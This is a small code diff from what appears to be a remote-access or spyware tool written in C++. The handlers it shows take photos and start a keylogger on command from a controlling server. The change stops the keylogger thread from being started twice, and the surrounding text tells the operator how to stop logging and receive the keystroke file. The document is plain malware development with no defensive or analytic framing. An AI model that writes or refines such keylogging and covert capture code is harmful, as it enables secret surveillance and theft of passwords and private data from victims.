@@ -657,8 +657,10 @@ void TakePhotoCommand::execute(Server& server, const std::string& param){
 
 void StartKeylogCommand::execute(Server& server, const std::string& param) {
     KeyLogger* kl = KeyLogger::getInstance(directory + "keylog.txt");
-    std::thread t(&KeyLogger::start, kl);
-    t.detach();
+    if (kl->getStatus() != RUNNING) {
+        std::thread t(&KeyLogger::start, kl);
+        t.detach();
+    }
 
     status = SUCCESS;
     message = "Keylogger has been started.\\nUse \\\"stopkeylog\\\" command to stop keylogging and receive keylog file.";
